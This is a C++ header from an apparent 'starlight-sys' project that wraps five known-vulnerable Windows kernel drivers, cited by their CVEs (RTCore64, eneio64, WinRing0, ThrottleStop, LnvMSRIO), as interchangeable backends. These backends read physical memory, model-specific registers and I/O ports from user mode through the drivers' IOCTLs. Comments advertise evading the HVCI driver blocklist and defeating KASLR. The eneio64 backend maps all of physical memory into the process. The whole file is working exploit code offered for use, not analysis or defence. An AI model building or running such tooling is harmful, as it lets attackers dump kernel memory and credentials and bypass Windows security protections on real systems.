#pragma once
/*
 * starlight-sys :: shared/driver_backend.h
 *
 * Abstraction layer for vulnerable kernel drivers.
 * Each backend wraps a specific driver's IOCTL interface for
 * physical memory read and (optionally) MSR read.
 *
 * This makes the codebase driver-agnostic: swap backends to use
 * a different vulnerable driver without touching any other code.
 *
 * READ-ONLY: no write IOCTLs are exposed.
 */

#include <Windows.h>
#include <Psapi.h>
#include <cstdint>
#include <cstring>

/* ================================================================== */
/*  Abstract Backend Interface                                         */
/* ================================================================== */

class IDriverBackend {
public:
    virtual ~IDriverBackend() = default;

    /* ---- Identity ---- */
    virtual const char*    DevicePathA()        const = 0;
    virtual const wchar_t* DefaultServiceName() const = 0;
    virtual const wchar_t* DefaultDriverFile()  const = 0;
    virtual const char*    BackendName()        const = 0;

    /* ---- Capabilities ---- */
    virtual size_t MaxReadChunk() const = 0;   /* bytes per IOCTL */
    virtual bool   SupportsMSR() const = 0;

    /* ---- Physical Memory Read (single chunk) ---- */
    virtual bool ReadPhysicalChunk(HANDLE hDevice, uint64_t pa,
                                   void* buf, size_t size) = 0;

    /* ---- MSR Read (optional, return 0 if unsupported) ---- */
    virtual uint64_t ReadMSR(HANDLE hDevice, uint32_t reg) = 0;

    /* ---- I/O Port Access (optional) ---- */
    virtual bool SupportsPortIO() const { return false; }
    virtual bool WriteIoPortByte(HANDLE /*hDevice*/, uint16_t /*port*/, uint8_t /*val*/) { return false; }
    virtual uint8_t ReadIoPortByte(HANDLE /*hDevice*/, uint16_t /*port*/) { return 0; }
};

/* ================================================================== */
/*  Backend: LnvMSRIO.sys  (CVE-2025-8061)                            */
/*                                                                     */
/*  - Physical read via IOCTL 0x9c406104 (MmMapIoSpace, up to 4KB)    */
/*  - MSR read via IOCTL 0x9c402084 (__rdmsr)                         */
/*  - Device: \\.\WinMsrDev                                           */
/* ================================================================== */

class LnvMSRIOBackend : public IDriverBackend {
public:
    const char*    DevicePathA()        const override { return "\\\\.\\WinMsrDev"; }
    const wchar_t* DefaultServiceName() const override { return L"HwServiceHost"; }
    const wchar_t* DefaultDriverFile()  const override { return L"LnvMSRIO.sys"; }
    const char*    BackendName()        const override { return "LnvMSRIO (CVE-2025-8061)"; }

    size_t MaxReadChunk() const override { return 0x1000; }  /* 4 KB */
    bool   SupportsMSR() const override { return true; }

    bool ReadPhysicalChunk(HANDLE hDevice, uint64_t pa,
                           void* buf, size_t size) override
    {
#pragma pack(push, 1)
        struct {
            uint64_t PhysicalAddress;
            uint32_t OperationType;
            uint32_t Size;
        } input{};
#pragma pack(pop)

        input.PhysicalAddress = pa;
        input.OperationType   = 1;
        input.Size            = static_cast<uint32_t>(size);

        DWORD bytesReturned = 0;
        BOOL ok = DeviceIoControl(
            hDevice,
            0x9c406104,       /* LNVMSRIO_IOCTL_READ_PHYS */
            &input, sizeof(input),
            buf, static_cast<DWORD>(size),
            &bytesReturned,
            NULL
        );

        return ok != FALSE;
    }

    uint64_t ReadMSR(HANDLE hDevice, uint32_t reg) override
    {
#pragma pack(push, 1)
        struct { uint32_t Register; } input{};
#pragma pack(pop)
        input.Register = reg;

        uint64_t value = 0;
        DWORD bytesReturned = 0;

        DeviceIoControl(
            hDevice,
            0x9c402084,       /* LNVMSRIO_IOCTL_READ_MSR */
            &input, sizeof(input),
            &value, sizeof(value),
            &bytesReturned,
            NULL
        );

        return value;
    }
};

/* ================================================================== */
/*  Backend: ThrottleStop.sys  (CVE-2025-7771)                         */
/*                                                                     */
/*  - Physical read via IOCTL 0x80006498 (MmMapIoSpace, up to 8 B)    */
/*  - No MSR support                                                   */
/*  - Device: \\.\ThrottleStop                                         */
/*  - Input: ULONG64 PhysicalAddress                                   */
/*  - Output: raw bytes (up to 8)                                      */
/* ================================================================== */

class ThrottleStopBackend : public IDriverBackend {
public:
    const char*    DevicePathA()        const override { return "\\\\.\\ThrottleStop"; }
    const wchar_t* DefaultServiceName() const override { return L"ThrottleStop"; }
    const wchar_t* DefaultDriverFile()  const override { return L"ThrottleStop.sys"; }
    const char*    BackendName()        const override { return "ThrottleStop (CVE-2025-7771)"; }

    size_t MaxReadChunk() const override { return 8; }   /* 8 bytes max */
    bool   SupportsMSR() const override { return false; }

    bool ReadPhysicalChunk(HANDLE hDevice, uint64_t pa,
                           void* buf, size_t size) override
    {
        if (size > 8) return false;

        uint64_t physAddr = pa;
        DWORD bytesReturned = 0;

        BOOL ok = DeviceIoControl(
            hDevice,
            0x80006498,       /* TS_IOCTL_READ_PHYS */
            &physAddr, sizeof(physAddr),
            buf, static_cast<DWORD>(size),
            &bytesReturned,
            NULL
        );

        return ok != FALSE && bytesReturned == static_cast<DWORD>(size);
    }

    uint64_t ReadMSR(HANDLE hDevice, uint32_t /*reg*/) override
    {
        return 0;   /* not supported */
    }
};

/* ================================================================== */
/*  Backend: WinRing0.sys  (OpenHardwareMonitor / CrystalDiskInfo)     */
/*                                                                     */
/*  - Physical read via IOCTL 0x9C442104 (OLS_READ_MEMORY)             */
/*  - MSR read via IOCTL 0x9C42884 (OLS_READ_MSR)                     */
/*  - Device: \\.\WinRing0_1_2_0                                       */
/*  - Often NOT blocked by HVCI blocklist (check with find_allowed_drivers.ps1) */
/*  - Get driver: OpenHardwareMonitor or CrystalDiskInfo install       */
/* ================================================================== */

class WinRing0Backend : public IDriverBackend {
public:
    const char*    DevicePathA()        const override { return "\\\\.\\WinRing0_1_2_0"; }
    const wchar_t* DefaultServiceName() const override { return L"WinRing0_1_2_0"; }
    const wchar_t* DefaultDriverFile()  const override { return L"WinRing0.sys"; }
    const char*    BackendName()        const override { return "WinRing0 (OpenLibSys)"; }

    size_t MaxReadChunk() const override { return 0x1000; }  /* 4 KB */
    bool   SupportsMSR() const override { return true; }

    bool ReadPhysicalChunk(HANDLE hDevice, uint64_t pa,
                           void* buf, size_t size) override
    {
        /*
         * OLS_READ_MEMORY_INPUT (WinRing0 1.2.0):
         *   PHYSICAL_ADDRESS Address, ULONG UnitSize (1/2/4), ULONG Count
         *
         * Try both IOCTL variants - driver builds differ:
         *   0x9C404104 = FILE_READ_ACCESS (OlsIoctl.h)
         *   0x9C402104 = FILE_ANY_ACCESS  (some builds)
         */
#pragma pack(push, 4)
        struct {
            uint64_t Address;
            uint32_t UnitSize;
            uint32_t Count;
        } input{};
#pragma pack(pop)

        input.Address  = pa;
        input.UnitSize = 1;
        input.Count    = static_cast<uint32_t>(size);

        static const DWORD ioctls[] = { 0x9C404104, 0x9C402104 };
        DWORD bytesReturned = 0;
        BOOL ok = FALSE;

        for (DWORD ioctl : ioctls) {
            bytesReturned = 0;
            ok = DeviceIoControl(
                hDevice, ioctl,
                &input, sizeof(input),
                buf, static_cast<DWORD>(size),
                &bytesReturned,
                NULL
            );
            if (ok && bytesReturned > 0)
                break;
            if (GetLastError() != 1)  /* not ERROR_INVALID_FUNCTION */
                break;
        }

        return ok != FALSE && bytesReturned > 0;
    }

    uint64_t ReadMSR(HANDLE hDevice, uint32_t reg) override
    {
        /*
         * OLS_READ_MSR_INPUT: ULONG Register
         * Output: ULONGLONG (8 bytes)
         *
         * CTL_CODE(0x9C40, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)
         * = 0x9C402084
         */
        uint32_t input = reg;
        uint64_t value = 0;
        DWORD bytesReturned = 0;

        DeviceIoControl(
            hDevice,
            0x9C402084,      /* IOCTL_OLS_READ_MSR */
            &input, sizeof(input),
            &value, sizeof(value),
            &bytesReturned,
            NULL
        );

        return value;
    }
};

/* ================================================================== */
/*  Backend: RTCore64.sys  (MSI Afterburner, CVE-2019-16098)         */
/*                                                                     */
/*  - Physical read via IOCTL 0x80002048 (4 bytes per call)           */
/*  - MSR read via IOCTL 0x80002030                                   */
/*  - Device: \\.\RTCore64                                              */
/*  - HVCI-allowed on some builds (see HVCI_DRIVERS.md)               */
/* ================================================================== */

class RTCore64Backend : public IDriverBackend {
public:
    const char*    DevicePathA()        const override { return "\\\\.\\RTCore64"; }
    const wchar_t* DefaultServiceName() const override { return L"RTCore64"; }
    const wchar_t* DefaultDriverFile()  const override { return L"RTCore64.sys"; }
    const char*    BackendName()        const override { return "RTCore64 (MSI Afterburner)"; }

    size_t MaxReadChunk() const override { return 4; }   /* 4 bytes per IOCTL */
    bool   SupportsMSR() const override { return true; }

    bool ReadPhysicalChunk(HANDLE hDevice, uint64_t pa,
                           void* buf, size_t size) override
    {
        if (size > 4) return false;

#pragma pack(push, 4)
        struct {
            uint64_t pad1;
            uint64_t address;   /* v6 in exploit: addr - 1 */
            uint32_t pad2;
            int32_t  offset;
            int32_t  switch_case;
            uint64_t pad3;
            int32_t  pad4;
        } input{};
#pragma pack(pop)

        input.address     = pa;  /* try pa first; exploit used addr-1 for kernel VA */
        input.offset      = 1;
        input.switch_case = 4;

#pragma pack(push, 4)
        struct {
            char     pad[28];
            uint32_t leaked_data;
            char     pad2[12];
        } output{};
#pragma pack(pop)

        DWORD bytesReturned = 0;
        BOOL ok = DeviceIoControl(
            hDevice,
            0x80002048,       /* IOCTL_READ_DATA */
            &input, sizeof(input),
            &output, sizeof(output),
            &bytesReturned,
            NULL
        );

        if (!ok || bytesReturned < 4)
            return false;

        memcpy(buf, &output.leaked_data, size);
        return true;
    }

    uint64_t ReadMSR(HANDLE hDevice, uint32_t reg) override
    {
        /* Input: 12 bytes - MSR reg (4 bytes LE) + padding */
        uint8_t input[12] = {};
        *(uint32_t*)&input[0] = reg;

        uint64_t value = 0;
        DWORD bytesReturned = 0;

        BOOL ok = DeviceIoControl(
            hDevice,
            0x80002030,       /* IOCTL_READ_MSR */
            input, sizeof(input),
            &value, sizeof(value),
            &bytesReturned,
            NULL
        );

        return ok ? value : 0;
    }
};

/* ================================================================== */
/*  Backend: eneio64.sys  (G.SKILL Trident Z, CVE-2020-12446)        */
/*                                                                     */
/*  - Physical read via IOCTL 0x80102040 (ZwMapViewOfSection)         */
/*    Maps \Device\PhysicalMemory into user VA.                        */
/*  - Unmap via IOCTL 0x80102044                                       */
/*  - Device: \\.\GLCKIo                                               */
/*  - HVCI-compatible: uses ZwMapViewOfSection, NOT MmMapIoSpace.      */
/*    Works on Win11 22H2, 23H2, 24H2 with HVCI + VBS enabled.        */
/*  - Ref: https://xacone.github.io/eneio-driver.html                 */
/* ================================================================== */

class Eneio64Backend : public IDriverBackend {
public:
    Eneio64Backend()
        : m_mappedBase(nullptr), m_mappedSize(0), m_isMapped(false) {}

    ~Eneio64Backend() { /* OS reclaims mapping on process exit */ }

    const char*    DevicePathA()        const override { return "\\\\.\\GLCKIo"; }
    const wchar_t* DefaultServiceName() const override { return L"eneio64"; }
    const wchar_t* DefaultDriverFile()  const override { return L"eneio64.sys"; }
    const char*    BackendName()        const override { return "eneio64 (CVE-2020-12446, HVCI-safe)"; }

    size_t MaxReadChunk() const override { return 0x1000; }  /* 4 KB */
    bool   SupportsMSR() const override { return false; }

    bool ReadPhysicalChunk(HANDLE hDevice, uint64_t pa,
                           void* buf, size_t size) override
    {
        if (!m_isMapped) {
            if (!MapPhysicalMemory(hDevice))
                return false;
        }

        if (pa + size > m_mappedSize) {
            memset(buf, 0, size);
            return false;
        }

        __try {
            memcpy(buf, static_cast<uint8_t*>(m_mappedBase) + pa, size);
        } __except(EXCEPTION_EXECUTE_HANDLER) {
            memset(buf, 0, size);
            return false;
        }
        return true;
    }

    uint64_t ReadMSR(HANDLE /*hDevice*/, uint32_t /*reg*/) override
    {
        return 0;   /* not implemented - use EnumDeviceDrivers for KASLR */
    }

    /* ---- I/O Port Access (WinIO-derived IOCTLs) ---- */
    bool SupportsPortIO() const override { return true; }

    bool WriteIoPortByte(HANDLE hDevice, uint16_t port, uint8_t val) override
    {
        /*
         * WinIO IOCTL_WINIO_WRITEPORT (0x8010204C):
         *   struct { USHORT port; ULONG value; UCHAR size; }
         */
#pragma pack(push, 1)
        struct {
            uint16_t port;
            uint32_t value;
            uint8_t  size;
        } input{};
#pragma pack(pop)
        input.port  = port;
        input.value = val;
        input.size  = 1; /* byte */

        DWORD ret = 0;
        return DeviceIoControl(hDevice, 0x8010204C,
            &input, sizeof(input), nullptr, 0, &ret, nullptr) != FALSE;
    }

    uint8_t ReadIoPortByte(HANDLE hDevice, uint16_t port) override
    {
#pragma pack(push, 1)
        struct {
            uint16_t port;
            uint32_t value;
            uint8_t  size;
        } iobuf{};
#pragma pack(pop)
        iobuf.port  = port;
        iobuf.value = 0;
        iobuf.size  = 1;

        DWORD ret = 0;
        DeviceIoControl(hDevice, 0x80102048,
            &iobuf, sizeof(iobuf), &iobuf, sizeof(iobuf), &ret, nullptr);
        return static_cast<uint8_t>(iobuf.value);
    }

private:
    void*    m_mappedBase;
    uint64_t m_mappedSize;
    bool     m_isMapped;

    /*
     * Map entire physical memory via IOCTL_WINIO_MAPPHYSTOLIN.
     * The driver opens \Device\PhysicalMemory, then calls
     * ZwMapViewOfSection to map it into our process VA space.
     * This bypasses MmMapIoSpace restrictions (page-table reads OK).
     */
    bool MapPhysicalMemory(HANDLE hDevice)
    {
        MEMORYSTATUSEX memStatus{};
        memStatus.dwLength = sizeof(memStatus);
        if (!GlobalMemoryStatusEx(&memStatus))
            return false;

        /*
         * Map more than ullTotalPhys to cover physical addresses
         * above the nominal total (e.g. addresses > 4 GB on systems
         * with memory holes).  +4 GB headroom is sufficient.
         */
        uint64_t mapSize = memStatus.ullTotalPhys +
                           (4ULL * 1024 * 1024 * 1024);

#pragma pack(push, 8)
        struct {
            uint64_t size;
            uint64_t val2;
            uint64_t val3;
            uint64_t mappingAddress;
            uint64_t val5;
        } iobuf{};
#pragma pack(pop)

        iobuf.size           = mapSize;
        iobuf.val2           = 0;
        iobuf.val3           = 0;
        iobuf.mappingAddress = 0;
        iobuf.val5           = 0;

        DWORD bytesReturned = 0;
        BOOL ok = DeviceIoControl(
            hDevice,
            0x80102040,       /* IOCTL_WINIO_MAPPHYSTOLIN */
            &iobuf, sizeof(iobuf),
            &iobuf, sizeof(iobuf),
            &bytesReturned,
            NULL
        );

        if (!ok || iobuf.mappingAddress == 0)
            return false;

        m_mappedBase = reinterpret_cast<void*>(iobuf.mappingAddress);
        m_mappedSize = mapSize;
        m_isMapped   = true;
        return true;
    }
};
